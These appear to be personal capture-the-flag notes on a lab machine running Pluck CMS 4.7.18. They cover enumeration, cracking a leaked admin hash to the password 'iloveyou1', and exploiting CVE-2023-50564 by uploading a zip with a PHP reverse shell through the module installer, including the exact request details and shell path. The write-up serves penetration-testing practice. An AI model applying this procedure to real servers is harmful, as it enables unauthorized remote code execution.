Port 80

![[Pasted image 20240918065427.png]]

![[Pasted image 20240918070211.png]]

![[Pasted image 20240918070330.png]]

pluck 4.7.18

`You have exceeded the number of login attempts. Please wait 5 minutes before logging in again.`

Port 3000

![[Pasted image 20240918065949.png]]

I make a test user account and take a look at the file poasted by admin on the greenhorn github page

![[Pasted image 20240918071124.png]]

This tells me the amount of tries i have so maybe i can modify the request with an `X-Forwarded_For` header to spoof my ip. Doesn't seem to work.

![[Pasted image 20240918072151.png]]

![[Pasted image 20240918072907.png]]

`d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163`

![[Pasted image 20240918073200.png]]

![[Pasted image 20240918073418.png]]

iloveyou1

---

This logs me into pluck.

https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC

1. Clone this repository:
```php
git clone https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC.git
cd CVE-2023-50564_Pluck-v4.7.18_PoC
```

2. Replace with the target domain name or IP address in the PoC script.
3. Create a `payload.zip` file containing `shell.php`. I recommand [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)PHP reverse shell and replace `<your_ip>` and `<port>` fields with your IP and listening port.
4. Run the PoC script:

```php
python exploit.py
```

5. You will be prompted to enter the path to the ZIP file:

```php
ZIP file path: ./path/to/payload.zip
```

Output example:

- If the login and upload are successful:
```php
Login account
ZIP file download.
<output of the executed shell.php>
```

- If a login error occurs:

```php
Login problem. response code: <code>
```

- If an upload error occurs:

```php
ZIP file download error. Response code: <code>
```

_Note_
Ensure that the `shell.php` file contains the correct reverse shell and your listener is waiting for the connection on the specified port.

---

Zip

```php
zip revzip revshell.php 
```

Install modules

Options -> manage modules -> install a module

![[Pasted image 20240918083531.png]]






---

Exploit crafting details:

`POST /admin.php?action=installmodule`

`Content-Disposition: form-data; name="sendfile"; filename="payload.zip"`
`Content-Type: application/zip`

`Cookie: PHPSESSID=ns152q98g9afg7otftf1nn5rvk; i_like_gitea=b865f5a34bba6134; lang=en-US; _csrf=JMaz581fnUIxGHlpppXcArSmTMQ6MTcyNjY0MDM4Nzk3MDc5MDk2Mw`

`http://<url>/data/modules/payload/shell.php`